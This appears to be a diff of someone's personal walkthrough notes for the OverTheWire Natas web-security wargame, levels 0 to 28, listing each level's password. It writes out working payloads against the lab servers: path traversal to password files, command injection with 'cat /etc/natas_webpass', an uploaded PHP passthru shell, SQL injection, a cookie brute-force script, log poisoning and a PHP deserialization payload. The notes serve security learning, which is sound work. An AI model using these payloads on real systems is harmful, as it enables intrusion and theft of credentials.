@@ -1,76 +1,569 @@
-Natas
 NATAS-
+
+
+---------------------------------------------------------------------------------------------------------------
 
 Level - 0 - 1
 
-Username: natas0 Password: natas0 URL: http://natas0.natas.labs.overthewire.org
+Username: natas0
+Password: natas0
+URL:      http://natas0.natas.labs.overthewire.org
 
-Source Code
+> Source Code 
+		<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+
+------------------------------------------------------------------------------------------------------------
 
 Level - 1 - > 2
 
-Username: natas1 Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto URL: http://natas1.natas.labs.overthewire.org
+Username: natas1
+Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+URL:      http://natas1.natas.labs.overthewire.org
 
-Use Devlopers tool
+> Use Devlopers tool
+ 		<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+
+
+------------------------------------------------------------------------------------------------------------
 
 Level - 2 - > 3
 
-Username: natas2 Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi URL: http://natas2.natas.labs.overthewire.org
+Username: natas2
+Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+URL:      http://natas2.natas.labs.overthewire.org
 
-Use Source Code > look for /files/pixel.png and visit http://natas2.natas.labs.overthewire.org/files/users.txt
+> Use Source Code > look for /files/pixel.png and visit http://natas2.natas.labs.overthewire.org/files/users.txt
 
-username:password
-alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH
+
+> ># username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+
+
+
+------------------------------------------------------------------------------------------------------------
 
 Level - 3 - > 4
 
-Username: natas3 Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 URL: http://natas3.natas.labs.overthewire.org
+Username: natas3
+Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+URL:      http://natas3.natas.labs.overthewire.org
 
-Look for "robots.txt"
+> Look for "robots.txt"
 
 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
 
-natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+> natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+
+
+------------------------------------------------------------------------------------------------------------
 
 Level - 4 - > 5
 
-Username: natas4 Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ URL: http://natas4.natas.labs.overthewire.org
+Username: natas4
+Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+URL:      http://natas4.natas.labs.overthewire.org
 
-Look for "Refrer-Header"
+> Look for "Refrer-Header"
 
 Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
+
+
+------------------------------------------------------------------------------------------------------------
+
 Level - 5 - > 6
 
-Username: natas5 Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq URL: http://natas5.natas.labs.overthewire.org
+Username: natas5
+Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+URL:      http://natas5.natas.labs.overthewire.org
 
-Check for cookies
+> Check for cookies
 
 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 
+
+------------------------------------------------------------------------------------------------------------
+
 Level - 6 - > 7
 
-Username: natas6 Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 URL: http://natas6.natas.labs.overthewire.org
+Username: natas6
+Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+URL:      http://natas6.natas.labs.overthewire.org
 
-Check source code look for ini file for a secret key
+> Check source code look for ini file for a secret key
 
-Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+> > Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+
+------------------------------------------------------------------------------------------------------------
 
 Level - 7 - > 8
 
-Username: natas7 Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 URL: http://natas7.natas.labs.overthewire.org
+Username: natas7
+Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+URL:      http://natas7.natas.labs.overthewire.org
 
-Do an LFI > /index.php?page=../../../../../../../../../../../../etc/natas_webpass/natas8
+> Do an LFI > /index.php?page=../../../../../../../../../../../../etc/natas_webpass/natas8
 
-DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+> >	DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+
+------------------------------------------------------------------------------------------------------------
+
 Level - 8 - > 9
 
-Username: natas8 Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe URL: http://natas8.natas.labs.overthewire.org
+Username: natas8
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+URL:      http://natas8.natas.labs.overthewire.org
 
-$encodedSecret = "3d3d516343746d4d6d6c315669563362"; echo bin2hex(strrev(base64_encode($encodedSecret))); echo base64_encode(strrev(hex2bin($encodedSecret))); echo " " echo base64_encode(strrev(hex2bin($encodedSecret)));
+> $encodedSecret = "3d3d516343746d4d6d6c315669563362"; 
+echo bin2hex(strrev(base64_encode($encodedSecret)));
+echo base64_encode(strrev(hex2bin($encodedSecret)));
+echo " "
+echo base64_encode(strrev(hex2bin($encodedSecret)));
+
+
+> > W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+------------------------------------------------------------------------------------------------------------
 
 Level - 9 - > 10
 
-Username: natas9 Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl URL: http://natas9.natas.labs.overthewire.org
+Username: natas9
+Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+URL:      http://natas9.natas.labs.overthewire.org
 
-$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+> Input:- demo | cat /etc/natas_webpass/natas10
+
+> > nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 10 - > 11
+
+Username: natas10
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+URL:      http://natas10.natas.labs.overthewire.org
+
+ This was eliminated from the command '/[;|&]/',$key there for after looking at grep command
+ it works like 
+> > "grep -i $key dictionary.txt" 
+replace with 
+> >"grep -i z /etc/natas_webpass/natas11 dictionary.txt"
+orignal input becomes 
+> z /etc/natas_webpass/natas11
+
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+> > U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+------------------------------------------------------------------------------------------------------------
+
+Level - 11 - > 12
+
+Username: natas11
+Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+URL:      http://natas11.natas.labs.overthewire.org
+
+DOUBT ----
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 11 - > 12
+
+Username: natas12
+Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+URL:      http://natas12.natas.labs.overthewire.org
+
+
+make a file .php
+
+<?php
+passthru('cat /etc/natas_webpass/natas13'); 
+// passthru function allows us to run commands on the server.
+// is similar to the exec () function.
+?>
+
+intercept request in burpsuite.and change file extension
+> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 12 - > 13
+
+Username: natas13
+Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+URL:      http://natas13.natas.labs.overthewire.org
+
+
+
+https://en.wikipedia.org/wiki/List_of_file_signatures
+
+
+here we need to use magic bytes in the file for particular extension > jpg 
+
+
+$ echo -en "\xFF\xD8\xFF\xE0\n<?\n\treadfile('/etc/natas_webpass/natas14');\n?>\n" > natas13.php
+
+
+
+> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 13 - > 14
+
+Username: natas14
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+URL:      http://natas14.natas.labs.overthewire.org
+
+
+use this QUERY --->     natas" OR 1=1 #
+
+>  Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 14 - > 15
+
+Username: natas15
+Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+URL:      http://natas15.natas.labs.overthewire.org
+
+
+SELECT * from users where username="natas16" and password LIKE BINARY "%W%"
+
+
+refer this blog: https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/29/natas15/
+
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 15 - > 16
+
+Username: natas16
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+URL:      http://natas16.natas.labs.overthewire.org
+
+
+refer this blog : https://www.jonyschats.nl/writeups/overthewire/natas/natas16/
+
+https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas16.md
+
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 16 - > 17
+
+Username: natas17
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+URL:      http://natas17.natas.labs.overthewire.org
+
+refrence : https://blog.anshumanonline.com/natas18/
+
+Password for next level: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 17 - > 18
+
+Username: natas18
+Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+URL:      http://natas18.natas.labs.overthewire.org
+
+1) Enter random user and password you will get logged in but now look for cookies
+you will get a ID with value: ranging from 1 - 640
+because source code has limit for max id.
+
+2) use burpsuite and intercept the request and make request multiple using indruter 
+for cookies from 1-640 and look for admin
+
+so on payload > 119 (we got admin is there and password for next level is )
+> Username: natas19
+> Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 18 - > 19
+
+Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+URL:      http://natas19.natas.labs.overthewire.org
+
+
+simple script we will use here, now we know looking at cookies it is encoded in ASSCI hex
+> [3136392d61646d696e = 169-admin]
+
+
+> ////////////////
+
+import requests
+from requests.auth import HTTPBasicAuth
+from time import sleep
+def main():
+    Auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+    Data = {'username':'admin', 'password':'admin','admin':'1'}
+    maxchange = 0
+    for i in range(0,640): 
+        sessstr = str(i)+'-admin'
+        sessid = sessstr.encode('hex')
+        cookie = {"PHPSESSID":sessid}
+        r = requests.get("http://natas19.natas.labs.overthewire.org/index.php?debug",params=Data,auth=Auth,cookies=cookie)
+        if('logged in as a regular user' not in r.text):
+            print("Admin:",i)
+            print(r.text)
+            break
+    
+    return
+    
+if __name__=='__main__':
+
+	main()
+
+> ////////////
+
+
+> Username: natas20
+> Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 19 - > 20
+
+Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+URL:      http://natas20.natas.labs.overthewire.org
+
+
+refrence: https://medium.com/@__cpg/natas20-overthewire-org-76df23b67bca
+
+> http://natas20.natas.labs.overthewire.org/index.php?debug=&name=%0Aadmin%201
+
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 20 - > 21
+
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+URL:      http://natas21.natas.labs.overthewire.org
+
+
+1. send a post Request on
+http://natas21-experimenter.natas.labs.overthewire.org/index.php
+with following paramters (simply submit form and intercept it with burpsuite )
+> append this &admin=1 with request paramters
+
+align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
+
+2.  now you get cookie that is PHPSESSID of this (http://natas21-experimenter.natas.labs.overthewire.org/index.php)
+use same cookies for (http://natas21.natas.labs.overthewire.org/)
+and you get the password for natas21
+
+> Username: natas22 
+  Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 21 - > 22
+
+Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+URL:      http://natas22.natas.labs.overthewire.org
+
+
+1. send a request http://natas22.natas.labs.overthewire.org/?revelio=
+and intercept it in burpsuite you will get 302-
+2. here the 302 response contains the credentails for next level
+
+> Username: natas23
+> Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 22 - > 23
+
+Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+URL:      http://natas23.natas.labs.overthewire.org
+
+
+We need to include a parameter passwd that both contains the string “iloveyou” and is greater than 10. 
+That seems really strange but it’s possible, given a peculiarity in the way PHP handles strings.
+ “11iloveyou” should convert to the integer 11 when converted, and of course contains “iloveyou.”
+
+
+ Username: natas24 
+ Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 23 - > 24
+
+Username: natas24
+Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+URL:      http://natas24.natas.labs.overthewire.org
+
+
+
+the credentials will only be displayed when the strcmp function returns True.
+According to the documentation, strcmp() returns -1, 0, 1 according to the result of the comparison. 
+However, the function also returns a 0 when it encounters an invalid comparison. 
+So, our aim would be to introduce an invalid comparison. 
+The easiest method would be to replace the string type parameter “passwd” with an array type. 
+This can be done by simply issuing a post request to the webpage with data as passwd[] =
+
+http://natas24.natas.labs.overthewire.org/?passwd[]=
+
+Username: natas25 
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 24 - > 25
+
+Username: natas25
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+URL:      http://natas25.natas.labs.overthewire.org
+
+
+
+To request access to file /etc/hosts. We will need to first traverse to the /directory and 
+then request for /ets/hosts.
+Consider the following filename " ....//....//....//....//etc/hosts ". 
+On being passed through the function, the application creates an actual filepath for us.
+../../../../etc/hosts is a valid path and application prints the information.
+
+http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//etc/passwd
+
+
+
+The logRequest() function stores information about the request at 
+” /var/www/natas/natas25/logs/natas25_ session_id() .log “. 
+The value of session_id() is controlled by us as it’s the value of PHPSESSID. 
+If we can include our password file in the log and then request to read the log file, 
+we will be able to attain the password. Since I’m using Burp Proxy,
+I requested the following to get the password.
+
+User-Agent: <? include "/etc/natas_webpass/natas26" ?>
+
+
+GET /?lang=....//logs/natas25_g0kmqkctf4hefr8vblu8m933s5.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <? include "/etc/natas_webpass/natas26" ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Connection: close
+Referer: http://natas25.natas.labs.overthewire.org/
+Cookie: PHPSESSID=g0kmqkctf4hefr8vblu8m933s5
+Upgrade-Insecure-Requests: 1
+
+> oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 25 - > 26
+
+Username: natas26
+Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+URL:      http://natas26.natas.labs.overthewire.org
+
+
+
+///
+<?php
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+        function __construct(){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="<?php include_once('/etc/natas_webpass/natas27');?>";
+            $this->logFile = "img/output.php";
+        }                         
+    }
+    $output[]=new Logger();
+    echo base64_encode(serialize($output));
+?>
+
+//
+
+execute above code with php and you will get an base64 as a output now open burpsuite and intercept request
+and send it to drawing parameter
+
+
+> YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL291dHB1dC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUxOiI8P3BocCBpbmNsdWRlX29uY2UoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO319
+
+and you will get response with image simply, make a path as 
+the /img/output.php
+and here you get 
+
+
+> 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ 
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 26 - > 27
+
+Username: natas27
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+URL:      http://natas27.natas.labs.overthewire.org
+
+
+1. give user name as : [natas28                                                 1]
+password as blank
+
+2. here we give a huge string as a blank space
+	now login with natas28 you will get access.
+
+	Welcome natas28!
+Here is your data:
+Array ( [username] => natas28 [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF ) 
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+Level - 27 - > 28
+
+Username: natas28
+Password: JWwR438wkgTsNKBbcJoowyysdM82YjeF
+URL:      http://natas28.natas.labs.overthewire.org
+
+
+
